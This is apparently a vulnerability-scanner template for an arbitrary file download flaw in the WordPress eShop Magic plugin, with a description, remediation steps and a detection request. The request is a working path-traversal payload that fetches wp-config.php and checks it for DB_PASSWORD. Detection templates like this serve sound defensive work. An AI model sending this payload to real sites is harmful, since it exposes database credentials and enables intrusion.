id: CNVD-2012-5790
info:
  name: WordPress_eshop_magic_Any file download
  author:
  - l0ne1y
  description: |-
    WordPress Plugin eShop Magic 'File' parameter arbitrary file download vulnerability
    WordPress is a content management system developed using PHP language. The wp-content/plugins/eshop-magic/download.php script in the WordPress eShop Magic plug-in fails to correctly filter the "file" GET parameter, allowing attackers to exploit the vulnerability to download the contents of arbitrary files in the system through directory traversal sequences.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: http://wordpress.org/extend/plugins/eshop-magic/changelog/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - ' contains(body,"DB_PASSWORD") && status_code==200 '
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
  method: GET
